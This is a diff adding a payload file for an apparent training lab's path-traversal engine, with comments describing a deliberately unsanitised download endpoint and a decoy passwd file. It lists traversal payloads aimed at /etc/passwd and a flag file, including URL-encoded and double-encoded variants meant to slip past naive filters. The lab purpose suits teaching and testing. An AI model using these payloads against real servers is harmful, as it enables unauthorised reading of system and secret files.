@@ -1,0 +1,43 @@
+# Directory-/path-traversal payloads for weblab's traversal engine.
+#
+# One payload per non-comment line; blank lines and lines starting with '#'
+# are ignored. These are the values the engine feeds to the /download?file=
+# sink. The sink joins the value onto the server's public/ directory without
+# sanitisation, so a leading "../" walks UP out of public/ and lets us read
+# files we were never meant to (the planted ../etc/passwd is the prize).
+#
+# Two families of payload are mixed here:
+#
+#   * plain "../" sequences -- the classic dot-dot-slash walk. One level of
+#     "../" escapes public/ to the sandbox root, where the decoy etc/passwd
+#     lives, so "../etc/passwd" is the shortest payload that wins.
+#
+#   * ENCODED variants -- the same walk hidden behind URL-encoding (%2f for
+#     "/", %2e for "."), the encoded-slash trick. They matter because a naive
+#     filter that only blocks the literal string "../" is defeated the moment
+#     the request layer URL-decodes "%2f" back into a slash *after* the filter
+#     ran. (Against this demo the server's query parser decodes %2f for us, so
+#     "..%2fetc%2fpasswd" resolves to "../etc/passwd" and also wins.)
+#
+# Deep escapes such as "../../../../etc/passwd" intentionally over-shoot: they
+# normalise to a path OUTSIDE the sandbox root and the jail rejects them (403).
+# We keep a couple here so the engine can prove the jail boundary exists.
+
+# --- plain dot-dot-slash: one level escapes public/ to the sandbox root ---
+../etc/passwd
+../../etc/passwd
+../secret/flag.txt
+
+# --- encoded slash (%2f) -- defeats naive "contains ../" filters ---
+..%2fetc%2fpasswd
+..%2Fetc%2Fpasswd
+%2e%2e%2fetc%2fpasswd
+%2e%2e/etc/passwd
+
+# --- double-encoded (a filter that decodes once still passes this through) ---
+..%252fetc%252fpasswd
+
+# --- deep escapes: over-shoot the root, expected to hit the 403 jail ---
+../../../../etc/passwd
+../../../../../../etc/passwd
+/etc/passwd
